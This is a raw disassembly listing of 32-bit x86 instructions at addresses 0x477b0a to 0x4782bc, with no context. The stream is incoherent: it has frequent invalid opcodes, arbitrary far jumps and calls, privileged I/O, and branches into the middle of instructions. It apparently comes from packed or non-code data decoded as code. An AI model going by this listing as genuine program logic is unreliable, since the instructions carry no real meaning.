  477b0a:	jne    0x477b61
  477b0c:	sar    BYTE PTR [edi-0x49],1
  477b0f:	pop    ebx
  477b10:	xor    eax,0x81c383af
  477b15:	aad    0x58
  477b17:	cmp    BYTE PTR [esp+eax*8-0x63],dh
  477b1b:	mov    WORD PTR [esi],fs
  477b1d:	dec    ebx
  477b1e:	sub    al,BYTE PTR [eax]
  477b20:	retf   0xeef1
  477b23:	ficom  DWORD PTR [edx]
  477b25:	repz dec ecx
  477b27:	xchg   ebx,ecx
  477b29:	mov    ch,0xc
  477b2b:	bound  edx,QWORD PTR [ecx+0x5d]
  477b2e:	mov    bh,0xf4
  477b30:	xchg   ebx,eax
  477b31:	gs stos DWORD PTR es:[edi],eax
  477b33:	add    eax,ebx
  477b35:	js     0x477b98
  477b37:	pushf  
  477b38:	or     BYTE PTR [esi+0x1],ch
  477b3b:	mov    edx,DWORD PTR [ecx-0x61]
  477b3e:	cli    
  477b3f:	jo     0x477b1a
  477b41:	call   0x5ce93fd4
  477b46:	adc    DWORD PTR [ecx],eax
  477b48:	and    eax,0x372b3d14
  477b4d:	js     0x477b7c
  477b4f:	add    DWORD PTR ds:0x853b0ba1,eax
  477b55:	fwait
  477b56:	pop    edx
  477b57:	sub    al,dl
  477b59:	and    BYTE PTR [ebp+edx*1+0x4],ch
  477b5d:	jbe    0x477bc0
  477b5f:	int3   
  477b60:	int3   
  477b61:	xor    DWORD PTR [ebx],esi
  477b63:	and    eax,0x762eee35
  477b68:	sub    eax,0xdc8c9c8
  477b6d:	call   0x8624bcab
  477b72:	pop    es
  477b73:	pop    ebp
  477b74:	sbb    al,0x26
  477b76:	rol    BYTE PTR [eax-0x3a37fc83],1
  477b7c:	call   0x4480:0x2b913bf4
  477b83:	push   0x66
  477b85:	inc    ecx
  477b86:	add    al,BYTE PTR [ecx-0x638f9f72]
  477b8c:	stos   DWORD PTR es:[edi],eax
  477b8d:	xor    cl,BYTE PTR [esi+0x73]
  477b90:	int3   
  477b91:	push   cs
  477b92:	(bad)  
  477b93:	ins    DWORD PTR es:[edi],dx
  477b94:	or     ebx,DWORD PTR es:[esi+0x68]
  477b98:	add    dl,BYTE PTR [ecx]
  477b9a:	xchg   esi,eax
  477b9b:	mov    edx,0x8b172eed
  477ba0:	scas   al,BYTE PTR es:[edi]
  477ba1:	jno    0x477ba8
  477ba3:	repz lahf 
  477ba5:	or     eax,0x8f410a2c
  477baa:	sbb    ch,BYTE PTR [ecx+eax*1]
  477bad:	sub    al,0x70
  477baf:	xchg   ebp,eax
  477bb0:	imul   ebx,DWORD PTR ds:0x2c61d93,0xe85537ff
  477bba:	retf   
  477bbb:	adc    dh,BYTE PTR [edx]
  477bbd:	sub    DWORD PTR [edx+0x49],esi
  477bc0:	(bad)  
  477bc1:	sub    eax,0x7b720dd
  477bc6:	cmp    esp,DWORD PTR [ebx]
  477bc8:	add    bh,BYTE PTR [ecx+0x4]
  477bcb:	pop    ds
  477bcc:	push   0x3806a7da
  477bd1:	xor    BYTE PTR [esi+0x21],bl
  477bd4:	push   0xc840ebf8
  477bd9:	and    al,BYTE PTR [ebx]
  477bdb:	mov    cs,WORD PTR [edi-0x51]
  477bde:	add    dl,BYTE PTR [esi-0x606c2879]
  477be4:	mov    al,0xfb
  477be6:	jl     0x477c20
  477be8:	mov    DWORD PTR [ebp-0x7d],ebx
  477beb:	and    ch,bl
  477bed:	aam    0xa4
  477bef:	or     ebx,DWORD PTR [edx]
  477bf1:	lock add DWORD PTR [ebx],edi
  477bf4:	loopne 0x477c70
  477bf6:	xor    al,0x1b
  477bf8:	ja     0x477b7d
  477bfa:	or     BYTE PTR [esi+0x5e214918],0xf4
  477c01:	lahf   
  477c02:	ret    
  477c03:	fadd   st,st(4)
  477c05:	popa   
  477c06:	enter  0xce51,0xdd
  477c0a:	jbe    0x477be3
  477c0c:	ins    DWORD PTR es:[edi],dx
  477c0d:	loopne 0x477c3f
  477c0f:	xor    esp,DWORD PTR [ebx]
  477c11:	js     0x477be8
  477c13:	aad    0x15
  477c15:	add    al,0x17
  477c17:	add    al,0x9d
  477c19:	cld    
  477c1a:	cwde   
  477c1b:	aaa    
  477c1c:	pop    ebp
  477c1d:	cwde   
  477c1e:	clc    
  477c1f:	test   al,0xf0
  477c21:	ret    
  477c22:	sub    BYTE PTR [edi+ebx*2-0x671f392f],al
  477c29:	sbb    DWORD PTR [eax],ebx
  477c2b:	jp     0x477c14
  477c2d:	in     eax,0xc2
  477c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  477c30:	sbb    eax,0xeb3961e4
  477c35:	sbb    eax,0x3b2025e9
  477c3a:	sbb    eax,0x3d259f66
  477c3f:	push   ss
  477c40:	je     0x477c5b
  477c42:	sar    DWORD PTR [esp+ebp*2+0x3823c839],0xba
  477c4a:	cmp    BYTE PTR [esi],cl
  477c4c:	shl    DWORD PTR ds:0xbb533968,cl
  477c52:	mov    ds:0xaedff702,al
  477c57:	in     al,0xd8
  477c59:	mov    ch,0x21
  477c5b:	mov    eax,ds:0xb599d8
  477c60:	sbb    DWORD PTR [eax+0x21],esp
  477c63:	xchg   edi,eax
  477c64:	cli    
  477c65:	bound  eax,QWORD PTR [ebp+0x17c643c]
  477c6b:	cmp    ch,ch
  477c6d:	nop
  477c6e:	pop    ss
  477c6f:	sbb    ecx,DWORD PTR [ebp+ebx*4-0x5e31c5b5]
  477c76:	xor    BYTE PTR [eax+0xe],al
  477c79:	cmp    DWORD PTR [esp+ecx*2],esp
  477c7c:	push   edx
  477c7d:	rol    BYTE PTR [edx+0x68],1
  477c80:	shl    BYTE PTR [esi-0x592c5ce9],0x6a
  477c87:	enter  0xe5a6,0xfc
  477c8b:	mov    ch,0x22
  477c8d:	js     0x477c14
  477c8f:	cmp    al,0x8a
  477c91:	sbb    BYTE PTR [edi+0x3b003aad],ch
  477c97:	push   esp
  477c98:	repnz mov al,ds:0x3b003f40
  477c9e:	dec    edi
  477c9f:	pusha  
  477ca0:	xchg   edi,eax
  477ca1:	mov    WORD PTR [edi],es
  477ca3:	les    eax,FWORD PTR [ecx]
  477ca5:	push   cs
  477ca6:	push   ss
  477ca7:	or     esi,DWORD PTR [esi]
  477ca9:	jae    0x477d1f
  477cab:	addr16 mov bl,0xa6
  477cae:	sbb    DWORD PTR [eax+0x6c044807],ecx
  477cb4:	or     cl,BYTE PTR [eax]
  477cb6:	dec    eax
  477cb7:	or     eax,0xc089a94
  477cbc:	xor    ebx,esp
  477cbe:	xor    BYTE PTR [edx],dh
  477cc0:	xchg   ebx,eax
  477cc1:	outs   dx,DWORD PTR ds:[si]
  477cc3:	stos   BYTE PTR es:[edi],al
  477cc4:	mov    al,0x5
  477cc6:	pop    esi
  477cc7:	mov    ah,0x3a
  477cc9:	cmp    DWORD PTR [ebx],ebp
  477ccb:	or     ah,dh
  477ccd:	pop    eax
  477cce:	fnstsw WORD PTR [eax+0x348709c0]
  477cd4:	nop
  477cd5:	fild   QWORD PTR [edi+0x55]
  477cd8:	xor    al,0x6c
  477cda:	stos   BYTE PTR es:[edi],al
  477cdb:	(bad)  
  477cde:	xor    eax,0x2f4f026
  477ce3:	xchg   DWORD PTR [ecx+ecx*8-0x26],ebp
  477ce7:	cmp    ebx,DWORD PTR [esi+0x61]
  477cea:	and    DWORD PTR [ecx+eiz*8],eax
  477ced:	scas   eax,DWORD PTR es:[edi]
  477cee:	push   cs
  477cef:	bsf    edi,DWORD PTR [ebx]
  477cf2:	js     0x477cf8
  477cf4:	jne    0x477d03
  477cf6:	push   ecx
  477cf7:	or     ecx,DWORD PTR [ebp+esi*8-0x2d]
  477cfb:	mov    cl,0x25
  477cfd:	cmp    bl,al
  477cff:	mov    cl,0x9b
  477d01:	and    dl,BYTE PTR [ecx-0x1f]
  477d04:	js     0x477ca7
  477d06:	jl     0x477d6f
  477d08:	mov    esi,0x6f58ddb6
  477d0d:	test   ebx,0xa6201976
  477d13:	js     0x477d41
  477d15:	lea    ebx,ss:[ecx+0x17]
  477d19:	sbb    bh,al
  477d1b:	xchg   esi,eax
  477d1c:	fiadd  DWORD PTR [ebx]
  477d1e:	pop    es
  477d1f:	or     al,0x86
  477d21:	jg     0x477d31
  477d23:	add    dl,ah
  477d25:	cmp    al,0x4b
  477d27:	cld    
  477d28:	mov    DWORD PTR [edx],ecx
  477d2a:	jmp    0x477d3c
  477d2c:	add    bl,BYTE PTR [ecx+0x37]
  477d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  477d30:	ret    
  477d31:	cmp    ah,cl
  477d33:	mov    esi,0x2d06dfed
  477d38:	rol    BYTE PTR [edi-0x35],0x83
  477d3c:	push   ds
  477d3d:	call   0x46cd24bc
  477d42:	nop
  477d43:	cmp    eax,DWORD PTR [ebx]
  477d45:	jne    0x477d57
  477d47:	sbb    bh,bl
  477d49:	inc    eax
  477d4a:	pop    es
  477d4b:	adc    BYTE PTR [esp+ebx*1-0x85bc6d7],0x55
  477d53:	adc    al,0xa
  477d55:	jns    0x477d3d
  477d57:	sub    al,BYTE PTR [eax]
  477d59:	sbb    cl,BYTE PTR ss:[edi-0x70]
  477d5d:	jb     0x477d18
  477d5f:	xlat   BYTE PTR ds:[ebx]
  477d60:	sbb    eax,0x685cc070
  477d65:	pusha  
  477d66:	fcom   QWORD PTR [ecx-0x3f]
  477d69:	adc    eax,0x27a37760
  477d6e:	mov    esi,ebx
  477d70:	xchg   esi,eax
  477d71:	mov    eax,ds:0x6c0b0411
  477d76:	pop    ss
  477d77:	jecxz  0x477d85
  477d79:	pop    ds
  477d7a:	cmp    edx,eax
  477d7c:	inc    ecx
  477d7d:	fisubr DWORD PTR [ebp-0x42]
  477d80:	ja     0x477df6
  477d82:	xor    al,dl
  477d84:	xor    dh,al
  477d86:	inc    edx
  477d87:	fcom   DWORD PTR [ebx+0x3de0d738]
  477d8d:	mov    WORD PTR [edi+ebx*4],cs
  477d90:	dec    ecx
  477d91:	fs lahf 
  477d93:	pop    edx
  477d94:	mov    edi,edx
  477d96:	xor    DWORD PTR [esi],0xb95b6603
  477d9c:	(bad)  
  477d9d:	call   edi
  477d9f:	pusha  
  477da0:	jl     0x477dba
  477da2:	nop
  477da3:	mov    esp,0x6b03e481
  477da8:	imul   edi,DWORD PTR [ebx],0x1f4c76ef
  477dae:	stc    
  477daf:	sbb    DWORD PTR [esi-0xdd3eac7],eax
  477db5:	add    DWORD PTR [esp+eax*8],ebp
  477db8:	adc    al,dl
  477dba:	dec    eax
  477dbb:	inc    ecx
  477dbc:	addr16 inc edi
  477dbe:	(bad)  
  477dbf:	pop    edi
  477dc0:	xchg   DWORD PTR [ecx+0x1d8b069e],ebp
  477dc6:	jl     0x477e32
  477dc8:	xor    al,0x70
  477dca:	adc    DWORD PTR [edx+ecx*1-0x470ac73],ecx
  477dd1:	mov    al,ds:0x9854c8ac
  477dd6:	xchg   esi,eax
  477dd7:	dec    ebp
  477dd8:	push   edi
  477dd9:	xor    bl,BYTE PTR [edi]
  477ddb:	mov    dl,0xd3
  477ddd:	loop   0x477e44
  477ddf:	pushf  
  477de0:	and    eax,0xb174e856
  477de5:	mov    al,ds:0x23f8a33d
  477dea:	sbb    eax,0xdc511b16
  477def:	mov    DWORD PTR [esi],eax
  477df1:	(bad)  
  477df2:	ins    BYTE PTR es:[edi],dx
  477df3:	ror    BYTE PTR [eax+edi*4-0x59],0x3c
  477df8:	xchg   ebp,eax
  477df9:	xor    BYTE PTR [edi-0x6b],al
  477dfc:	xchg   esi,eax
  477dfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  477dfe:	push   eax
  477dff:	sub    al,0x89
  477e01:	nop
  477e02:	unpcklps xmm3,XMMWORD PTR [eax]
  477e05:	push   cs
  477e06:	int3   
  477e07:	or     al,0x4
  477e09:	sbb    DWORD PTR [ebp-0x4b52132c],eax
  477e0f:	in     eax,dx
  477e10:	cmp    DWORD PTR [edi-0x70],ecx
  477e13:	push   es
  477e14:	int3   
  477e15:	jo     0x477e47
  477e17:	sahf   
  477e18:	mov    edi,DWORD PTR [ebp+edx*2+0x5c]
  477e1c:	test   ax,0x3fe1
  477e20:	xlat   BYTE PTR ds:[ebx]
  477e21:	arpl   WORD PTR [eax+0x4f060e5f],di
  477e27:	movsx  edx,WORD PTR ds:0xc46cbbd6
  477e2e:	call   0xcd1b5f3
  477e33:	xchg   esi,eax
  477e34:	out    dx,al
  477e35:	call   DWORD PTR ds:0x5db3281c
  477e3b:	adc    BYTE PTR [ebp+0x31],0xfc
  477e3f:	int    0x14
  477e41:	mov    edi,0x207c32e1
  477e46:	leave  
  477e47:	mov    al,0xa5
  477e49:	push   ebx
  477e4a:	or     BYTE PTR [edx+0x5a],cl
  477e4d:	jmp    0x7b83:0x681113c2
  477e54:	(bad)  
  477e55:	adc    al,0xda
  477e57:	in     al,0xb6
  477e59:	jo     0x477de6
  477e5b:	arpl   WORD PTR [edi+0x2e8c4d47],ax
  477e61:	pop    ss
  477e62:	idiv   ah
  477e64:	rcr    BYTE PTR [edx-0x10],cl
  477e67:	test   eax,0x2a93fc9f
  477e6c:	aas    
  477e6d:	xor    ebx,ebx
  477e6f:	cmp    esi,DWORD PTR ds:0xa8e874ce
  477e75:	aas    
  477e76:	adc    bl,ah
  477e78:	cmp    esi,DWORD PTR [eax-0x8]
  477e7b:	je     0x477ecb
  477e7d:	mov    dh,BYTE PTR [edx]
  477e7f:	dec    eax
  477e80:	clc    
  477e81:	jle    0x477e96
  477e83:	mov    esp,0x88902ec2
  477e88:	ror    ah,cl
  477e8a:	push   esi
  477e8b:	sbb    al,0x3d
  477e8d:	push   cs
  477e8e:	pop    ebx
  477e8f:	inc    ebx
  477e90:	dec    ebx
  477e91:	les    edx,FWORD PTR [ecx]
  477e93:	xchg   edx,eax
  477e95:	inc    esp
  477e96:	xchg   BYTE PTR [ebx-0x22],al
  477e99:	add    cl,ah
  477e9b:	in     al,dx
  477e9c:	cld    
  477e9d:	fiadd  DWORD PTR [ecx]
  477e9f:	sub    eax,0x54620a28
  477ea4:	or     DWORD PTR [eax+0x7c43e431],edi
  477eaa:	ins    DWORD PTR es:[edi],dx
  477eab:	and    al,0x6e
  477ead:	aaa    
  477eae:	mov    DWORD PTR [ecx+0x7069048],esp
  477eb4:	jns    0x477e93
  477eb6:	rcl    BYTE PTR [edi-0x16],1
  477eb9:	mov    dh,0xfb
  477ebb:	pop    ss
  477ebc:	rcr    BYTE PTR [ebp+0x1c],1
  477ebf:	and    ax,WORD PTR ds:0x151426f8
  477ec6:	cld    
  477ec7:	mov    WORD PTR [esi],ss
  477ec9:	jbe    0x477eb7
  477ecb:	or     eax,0x45a0d03b
  477ed0:	test   BYTE PTR [edx+0x43],0xba
  477ed4:	ja     0x477e58
  477ed6:	callw  0xe886
  477eda:	retf   
  477edb:	pop    eax
  477edc:	mov    esi,DWORD PTR [eax+edi*4]
  477edf:	push   ebp
  477ee0:	push   0xffffff99
  477ee2:	je     0x477e96
  477ee4:	not    DWORD PTR [ebp+0x4c]
  477ee7:	cmp    eax,DWORD PTR [edi-0x10]
  477eea:	cs add al,0x3b
  477eed:	shr    BYTE PTR [edi],cl
  477eef:	xor    al,0x4
  477ef1:	out    0xd8,eax
  477ef3:	push   0xf
  477ef5:	aas    
  477ef6:	icebp  
  477ef7:	sub    eax,0x74011c1b
  477efc:	sbb    BYTE PTR [ebx],bl
  477efe:	idiv   DWORD PTR [ebp+0x1]
  477f01:	add    al,al
  477f03:	pusha  
  477f04:	loopne 0x477f07
  477f06:	push   ebp
  477f07:	xchg   edi,eax
  477f08:	xor    BYTE PTR [esi],al
  477f0a:	and    DWORD PTR [edx-0x10caf7af],edi
  477f10:	push   0x731f5dc3
  477f15:	shl    BYTE PTR [ebx+0xc],1
  477f18:	loop   0x477edd
  477f1a:	inc    esi
  477f1b:	adc    bh,ch
  477f1d:	test   al,0x7f
  477f1f:	push   ebx
  477f20:	sbb    bh,BYTE PTR [eax+esi*4]
  477f23:	inc    DWORD PTR [ebx-0x34]
  477f26:	or     esi,DWORD PTR [ebx]
  477f28:	leave  
  477f29:	push   0xffffff93
  477f2b:	pop    ebp
  477f2c:	add    al,0xad
  477f2e:	add    al,0x6c
  477f30:	xchg   edi,eax
  477f31:	jmp    0x477f96
  477f33:	fdiv   DWORD PTR [ebx]
  477f35:	or     DWORD PTR [ecx],eax
  477f37:	xor    ecx,DWORD PTR [ecx+edx*1+0x10]
  477f3b:	addr16 inc eax
  477f3d:	mov    ah,0x2f
  477f3f:	pop    es
  477f40:	and    eax,0x898056a
  477f45:	js     0x477fa4
  477f47:	dec    ebx
  477f48:	sbb    ecx,esp
  477f4a:	adc    eax,0xfcce98a4
  477f4f:	and    BYTE PTR [edx-0x7],ch
  477f52:	clc    
  477f53:	ror    BYTE PTR [eax],0xd2
  477f56:	ret    
  477f57:	(bad)  
  477f58:	aaa    
  477f59:	aaa    
  477f5a:	jne    0x477f14
  477f5c:	dec    ebx
  477f5d:	int3   
  477f5e:	in     al,0xf0
  477f60:	jge    0x477f7b
  477f62:	sub    eax,esi
  477f64:	mov    ecx,eax
  477f66:	shl    ecx,0x2
  477f69:	sbb    ebx,DWORD PTR [ecx]
  477f6b:	jmp    0x440b:0xb0148d7e
  477f72:	cldemote BYTE PTR [esp+edi*1+0x74]
  477f77:	das    
  477f78:	or     BYTE PTR [ecx],dh
  477f7a:	or     al,0xb1
  477f7c:	add    ah,bh
  477f7e:	shl    DWORD PTR [eax+0x10fdf597],0x72
  477f85:	out    dx,eax
  477f86:	mov    cl,0xca
  477f88:	or     DWORD PTR [edi],esp
  477f8a:	dec    edx
  477f8b:	fcmovne st,st(4)
  477f8d:	push   eax
  477f8e:	mov    DWORD PTR [edi+eax*1-0x7b],esi
  477f92:	add    ebx,DWORD PTR [ecx]
  477f94:	jne    0x477f9b
  477f96:	into   
  477f97:	test   DWORD PTR [eax+0x35],edi
  477f9a:	add    BYTE PTR [edi],ah
  477f9c:	in     al,dx
  477f9d:	aas    
  477f9e:	jmp    0x109e98d5
  477fa3:	test   DWORD PTR [edi-0x1be0df5b],0x41548a73
  477fad:	jmp    0xa0388d9b
  477fb2:	mov    eax,0xb58dce12
  477fb7:	xchg   edx,eax
  477fb8:	cmp    DWORD PTR [eax+eax*2-0x30],0x5b
  477fbd:	inc    ecx
  477fbe:	dec    esp
  477fbf:	shl    BYTE PTR [eax],cl
  477fc1:	mov    bl,0x5f
  477fc3:	inc    ebx
  477fc4:	jbe    0x478009
  477fc6:	ret    
  477fc7:	or     BYTE PTR ds:0x496f213b,0xe1
  477fce:	shl    DWORD PTR [eax-0xb],1
  477fd1:	push   esi
  477fd2:	mov    cl,BYTE PTR [edi]
  477fd4:	inc    edi
  477fd5:	popf   
  477fd6:	xor    BYTE PTR [edx-0x4fadff9f],bl
  477fdc:	addr16 inc eax
  477fde:	cwde   
  477fdf:	popa   
  477fe0:	cmp    al,0x8b
  477fe2:	push   eax
  477fe3:	or     al,0xdc
  477fe5:	inc    esi
  477fe6:	adc    ecx,DWORD PTR [ecx-0x7a351be5]
  477fec:	leave  
  477fed:	add    cl,0x13
  477ff0:	mov    dh,dh
  477ff2:	push   ecx
  477ff3:	pop    esi
  477ff4:	jmp    0x478007
  477ff6:	and    al,0x8
  477ff8:	mov    BYTE PTR [edi+0x49],ch
  477ffb:	popa   
  477ffc:	addr16 adc ebp,ebx
  477fff:	add    eax,0x8bca03f7
  478004:	shr    ebp,1
  478006:	scas   eax,DWORD PTR es:[edi]
  478007:	js     0x478020
  478009:	or     eax,0x1eb64f7
  47800e:	inc    ecx
  47800f:	cmp    ecx,DWORD PTR [eax+0x8]
  478012:	jge    0x477fb2
  478014:	pop    eax
  478015:	push   eax
  478016:	dec    ebp
  478017:	in     eax,dx
  478018:	std    
  478019:	add    al,0x3b
  47801b:	adc    al,0x8b
  47801d:	jne    0x478011
  47801f:	sbb    BYTE PTR [ebp+0x7a],dh
  478022:	leave  
  478023:	pop    esi
  478024:	rcl    DWORD PTR [eax+0x37982b92],0xf9
  47802b:	or     edi,DWORD PTR [esi+0x29]
  47802e:	mov    cs,WORD PTR [edx+0x5451a341]
  478034:	inc    esp
  478035:	adc    bh,al
  478037:	test   eax,eax
  478039:	or     eax,0xf05b5150
  47803e:	sbb    al,BYTE PTR [ebp-0x3ccb587f]
  478044:	and    DWORD PTR [eax+edx*8-0xeea60ed],ecx
  47804b:	pop    esp
  47804c:	aad    0x54
  47804e:	cmp    edi,edx
  478050:	sub    ch,BYTE PTR [ecx-0x39]
  478053:	mov    dl,0x16
  478055:	sti    
  478056:	les    esp,FWORD PTR ds:0x456ff30
  47805c:	in     eax,0x38
  47805e:	inc    ecx
  47805f:	mov    bl,0x21
  478061:	(bad)  
  478063:	fcomip st,st(0)
  478065:	(bad)
  478069:	ins    BYTE PTR es:[edi],dx
  47806a:	aad    0x30
  47806c:	(bad)  
  47806d:	sbb    al,0xa4
  47806f:	mov    ebx,0x8e7ef71
  478074:	cmp    esi,0x25a75276
  47807a:	cmp    eax,DWORD PTR [ecx]
  47807c:	loopne 0x4780ef
  47807e:	push   ss
  47807f:	lods   eax,DWORD PTR ds:[esi]
  478080:	pop    ds
  478081:	inc    ebp
  478082:	mov    ebp,0xe2c1d6b0
  478087:	add    al,BYTE PTR [edi-0x7d258be6]
  47808d:	xor    BYTE PTR [edx-0x80],cl
  478090:	imul   edi,DWORD PTR [bx+di-0x50],0xffffffd8
  478095:	cs in  al,0x50
  478098:	jle    0x47807f
  47809a:	and    BYTE PTR [eax],cl
  47809c:	cmp    esi,DWORD PTR [edx]
  47809e:	cld    
  47809f:	jnp    0x47811f
  4780a1:	sbb    DWORD PTR [esi],eax
  4780a3:	mov    esi,0x15024682
  4780a8:	mov    DWORD PTR [ebx],eax
  4780aa:	shl    BYTE PTR [esi+eiz*2-0x73487bee],1
  4780b1:	xchg   edx,eax
  4780b2:	lods   eax,DWORD PTR ds:[esi]
  4780b3:	daa    
  4780b4:	push   eax
  4780b5:	call   0x4e2fbd79
  4780ba:	mov    edi,esi
  4780bc:	sub    edi,ebp
  4780be:	jg     0x4780ce
  4780c0:	dec    edi
  4780c1:	pop    esp
  4780c2:	dec    ebx
  4780c3:	dec    ebp
  4780c4:	inc    edi
  4780c5:	test   DWORD PTR [esi+eiz*1],eax
  4780c8:	sbb    dl,bh
  4780ca:	cmp    ch,BYTE PTR [ebx]
  4780cc:	mov    dl,dl
  4780ce:	rol    BYTE PTR [ebp-0x735cf861],0x3a
  4780d5:	aam    0xeb
  4780d7:	xchg   esi,eax
  4780d8:	(bad)  
  4780d9:	rol    eax,1
  4780db:	dec    ebp
  4780dc:	add    eax,DWORD PTR [esi+0x1e]
  4780df:	inc    esi
  4780e0:	and    BYTE PTR [eax],al
  4780e2:	pop    eax
  4780e3:	(bad)
  4780e6:	lds    ebx,FWORD PTR [edi]
  4780e8:	stc    
  4780e9:	xchg   edx,eax
  4780ea:	rol    BYTE PTR [edi+0x51],1
  4780ed:	xor    eax,0x447af618
  4780f2:	inc    ecx
  4780f3:	cmp    BYTE PTR [ecx-0x5042d2fd],ah
  4780f9:	mov    bh,0x1b
  4780fb:	adc    DWORD PTR ds:0x7c7756e7,esi
  478101:	call   0xebc1cac
  478106:	scas   eax,DWORD PTR es:[edi]
  478107:	or     BYTE PTR [ebx-0x1c],0x70
  47810b:	add    DWORD PTR [edx+eiz*2+0x4be29701],ecx
  478112:	pop    esi
  478113:	dec    esp
  478114:	mov    ecx,gs
  478116:	adc    BYTE PTR [ebp-0x80],al
  478119:	js     0x47813b
  47811b:	das    
  47811c:	push   esi
  47811d:	dec    eax
  47811e:	ins    BYTE PTR es:[edi],dx
  47811f:	mov    esp,0x78409575
  478124:	jbe    0x4780c6
  478126:	shl    BYTE PTR [ebp+0xf],1
  478129:	xchg   ebp,eax
  47812a:	jmp    0x47814a
  47812c:	dec    edi
  47812d:	add    dh,BYTE PTR [ebp+0x15]
  478130:	cs push esi
  478132:	fld    TBYTE PTR [ecx-0x1c4c400]
  478138:	or     eax,0x8f24aa1
  47813d:	inc    ebx
  47813e:	pop    ss
  47813f:	inc    ebp
  478140:	ja     0x478170
  478142:	jne    0x478124
  478144:	or     edi,edx
  478146:	mov    al,BYTE PTR [ebx+0xd]
  478149:	or     DWORD PTR [edx+0x2fc04787],eax
  47814f:	aaa    
  478150:	sbb    esp,DWORD PTR [edx-0x3f]
  478153:	xchg   edx,eax
  478154:	jae    0x47815b
  478156:	lds    edx,FWORD PTR cs:[edx+0x7a1c8163]
  47815d:	pop    esi
  47815e:	xchg   esi,eax
  47815f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478160:	lds    esp,FWORD PTR [eax+0x5ab8815f]
  478166:	inc    esp
  478167:	popa   
  478168:	les    esp,FWORD PTR [ecx-0x7f0e9624]
  47816e:	pop    esp
  47816f:	stc    
  478170:	push   cs
  478171:	fdiv   DWORD PTR [edx+0x44]
  478174:	sbb    al,0x41
  478176:	enter  0xd03b,0xb
  47817a:	push   ebp
  47817b:	in     eax,0x22
  47817d:	(bad)  
  47817e:	in     al,0xc1
  478180:	inc    edi
  478181:	shl    DWORD PTR [ecx],1
  478183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478184:	inc    edi
  478185:	popf   
  478186:	add    al,0x43
  478188:	xor    al,bl
  47818a:	icebp  
  47818b:	ficom  WORD PTR [eax+0x7d]
  47818e:	cli    
  47818f:	mov    eax,0xffea3ab8
  478194:	push   edx
  478195:	xchg   esp,eax
  478196:	ret    0x1f81
  478199:	sar    eax,0x5
  47819c:	mov    edi,eax
  47819e:	shl    edi,0x84
  4781a1:	inc    ecx
  4781a3:	int3   
  4781a4:	jge    0x4781c0
  4781a6:	sub    ebp,eax
  4781a8:	shl    ebp,0x2
  4781ab:	cmp    ebp,edi
  4781ad:	je     0x4781fe
  4781af:	ss inc esp
  4781b1:	rol    DWORD PTR [edi-0x24e961d3],cl
  4781b7:	sbb    ah,BYTE PTR [ecx+eax*1]
  4781ba:	inc    edi
  4781bb:	dec    esi
  4781bc:	test   eax,0x1f53b955
  4781c1:	adc    bh,BYTE PTR [esi]
  4781c3:	push   ebp
  4781c4:	inc    edx
  4781c5:	call   DWORD PTR es:[esi]
  4781c8:	pop    es
  4781c9:	xlat   BYTE PTR ds:[ebx]
  4781ca:	push   0xd0bc6825
  4781cf:	push   cs
  4781d0:	adc    BYTE PTR [esi+0x75bd690b],bh
  4781d6:	ss aad 0x13
  4781d9:	sbb    dl,BYTE PTR [eax+ecx*4-0x41]
  4781dd:	add    BYTE PTR [edx+0x4f1e90c0],al
  4781e3:	cmp    edx,DWORD PTR [eax+0x4]
  4781e6:	jae    0x4781ea
  4781e8:	adc    al,0x5c
  4781ea:	mov    WORD PTR [edi],cs
  4781ec:	mov    dl,0x8
  4781ee:	leave  
  4781ef:	je     0x478237
  4781f1:	stos   DWORD PTR es:[edi],eax
  4781f2:	inc    esp
  4781f3:	mov    ch,0xf5
  4781f5:	add    bl,al
  4781f7:	btr    DWORD PTR [esi],eax
  4781fa:	add    BYTE PTR [eax],0xf
  4781fd:	mov    WORD PTR [ebx],ds
  4781ff:	lods   eax,DWORD PTR ds:[esi]
  478201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478202:	hlt    
  478203:	lock push edx
  478205:	push   ecx
  478206:	inc    edx
  478207:	adc    edi,DWORD PTR [esi]
  478209:	jmp    0x4781e5
  47820b:	lahf   
  47820c:	sbb    al,BYTE PTR ds:0x4bd82f73
  478212:	push   0x4d
  478214:	sub    ch,cl
  478216:	mov    esi,0xf6b24080
  47821b:	int3   
  47821c:	dec    eax
  47821d:	fadd   QWORD PTR ds:0xb0b40270
  478223:	mov    al,0x74
  478225:	xor    ebx,DWORD PTR [ebx]
  478227:	call   FWORD PTR [edi+0x6830b94d]
  47822d:	cmp    dl,0x1f
  478230:	ja     0x478238
  478232:	and    edx,0x7f
  478235:	bt     DWORD PTR ds:0xd7ead1a7,ecx
  47823c:	jb     0x478255
  47823e:	ja     0x478245
  478240:	mov    esi,0xba9fdbff
  478245:	fs ret 0x3bf4
  478249:	ret    0x127c
  47824c:	adc    bl,ch
  47824e:	push   cs
  47824f:	inc    eax
  478250:	cmp    al,0x20
  478252:	jne    0x478229
  478254:	inc    esi
  478255:	dec    DWORD PTR [ecx+edx*4]
  478258:	and    bl,BYTE PTR [ecx]
  47825a:	out    dx,eax
  47825b:	and    al,0x75
  47825d:	mov    ecx,0xa5cf5ac4
  478262:	nop
  478263:	das    
  478264:	push   esi
  478265:	aaa    
  478266:	xor    ebx,DWORD PTR [esi-0x4c]
  478269:	push   0x0
  47826b:	push   cs
  47826c:	and    al,0xb2
  47826e:	xchg   edx,eax
  47826f:	call   0xcf12:0x3b830111
  478276:	add    DWORD PTR [edi],esi
  478278:	fs (bad) 
  47827a:	pusha  
  47827b:	repnz dec eax
  47827d:	sbb    bl,BYTE PTR [edi-0x6db7e114]
  478283:	or     DWORD PTR [ecx+0x6d],edx
  478286:	ficomp WORD PTR ds:0xbf2c0669
  47828c:	test   BYTE PTR [eax+0x414834f5],dl
  478292:	mov    bh,0x53
  478294:	imul   eax,DWORD PTR [ecx+ebp*4],0x373f0ec
  47829b:	push   esi
  47829c:	add    al,0x28
  47829e:	and    eax,DWORD PTR [ebp-0x1efa1317]
  4782a4:	mov    ecx,0x68dd59b8
  4782a9:	jno    0x47824d
  4782ab:	inc    ebp
  4782ac:	dec    eax
  4782ad:	ret    
  4782ae:	mov    ebx,0x89134955
  4782b3:	cmp    esp,DWORD PTR ds:0xe09847c2
  4782b9:	fwait
  4782ba:	or     eax,DWORD PTR [ebx]
  4782bc:	outs   dx,BYTE PTR ds:[esi]
